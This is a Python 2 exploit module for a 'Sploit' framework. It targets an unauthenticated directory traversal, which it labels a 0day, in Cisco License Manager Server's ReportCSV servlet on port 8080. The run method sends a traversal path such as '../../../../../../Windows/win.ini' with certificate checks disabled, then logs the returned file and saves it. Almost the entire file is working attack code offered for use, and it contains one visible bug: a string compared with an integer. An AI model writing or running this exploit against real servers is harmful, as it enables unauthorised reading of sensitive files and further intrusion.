#!/usr/bin/env python

import urllib2
import ssl
from collections import OrderedDict


from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_cisco_license_manager_server_directory_traversal"
INFO['DESCRIPTION'] = "Cisco License Manager Server Directory Traversal"
INFO['VENDOR'] = "https://www.cisco.com"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    This vulnerability allows remote attackers to disclose sensitive information on vulnerable installations of\
Cisco License Manager Server. Authentication is not required to exploit this vulnerability.

    The specific flaw exists within the ReportCSV servlet, which listens on TCP port 8080 by default.\
The issue results from the lack of proper validation of a user-supplied path prior to using it in file operations.\
An attacker can leverage this vulnerability to read any files accessible to the SYSTEM user.
Tested against Cisco License Manager Server 3.2.6 on Windows 7 x64 SP1.
"""
INFO["DOWNLOAD_LINK"] = "https://software.cisco.com/download/release.html?mdfid=280841731&softwareid=282885668&os=Windows&release=3.2.6&relind=AVAILABLE&rellifecycle=&reltype=latest"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "10 Oct, 2017"
INFO['PATH'] = "WEB/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.176"
OPTIONS["PORT"] = 8080
OPTIONS["FILENAME"] = "../../../../../../Windows/win.ini"
OPTIONS["SSL"] = False


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.payload = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.ssl = self.args.get("SSL", OPTIONS["SSL"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        url = '{}://{}:{}/'.format(proto, self.host, self.port) + path
        return url

    def run(self):
        #Get options from gui
        self.args()
        self.log('[*] Trying to recieve ' + self.filename)
        url = self.make_url('clm-report/ReportCSV?filename=' + urllib2.quote(self.filename))
        context = ssl._create_unverified_context()
        res = urllib2.urlopen(url, context=context).read()
        if res < 15000:
            self.log(res)
        self.writefile(res, self.filename.replace('\\', '/').split('/').pop())
        self.log(res)
        self.finish(True)



if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()